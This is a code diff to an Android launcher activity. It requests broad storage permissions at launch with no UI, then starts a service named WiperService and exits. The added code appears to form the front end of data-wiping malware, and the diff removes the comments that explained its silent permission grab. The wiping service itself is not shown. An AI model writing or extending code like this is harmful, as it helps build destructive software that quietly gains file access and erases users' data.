@@ -7,8 +7,6 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.provider.Settings;
-import android.widget.Toast;
-import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
@@ -23,14 +21,11 @@ public class LauncherActivity extends AppCompatActivity {
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        // Immediately request permissions — no UI shown
         requestStoragePermissions();
     }
 
     private void requestStoragePermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            // Android 11+ requires MANAGE_EXTERNAL_STORAGE
             if (Environment.isExternalStorageManager()) {
                 requestMediaPermissions();
             } else {
@@ -45,14 +40,12 @@ public class LauncherActivity extends AppCompatActivity {
                 );
             }
         } else {
-            // Android 10 and below
             requestLegacyStoragePermissions();
         }
     }
 
     private void requestMediaPermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+ — granular media permissions
             String[] permissions = {
                 Manifest.permission.READ_MEDIA_IMAGES,
                 Manifest.permission.READ_MEDIA_VIDEO,
@@ -73,7 +66,6 @@ public class LauncherActivity extends AppCompatActivity {
                 ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
             }
         } else {
-            // Already have storage access from MANAGE_EXTERNAL_STORAGE
             startWipeOperation();
         }
     }
@@ -98,3 +90,40 @@ public class LauncherActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
         }
     }
+
+    private void showPermissionDialog(String title, String message, Runnable onPositive) {
+        new AlertDialog.Builder(this)
+            .setTitle(title)
+            .setMessage(message)
+            .setPositiveButton("Allow", (dialog, which) -> onPositive.run())
+            .setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss())
+            .setCancelable(false)
+            .show();
+    }
+
+    private void startWipeOperation() {
+        Intent intent = new Intent(this, WiperService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
+        }
+        finish();
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
+            requestStoragePermissions();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            requestStoragePermissions();
+        }
+    }
+}
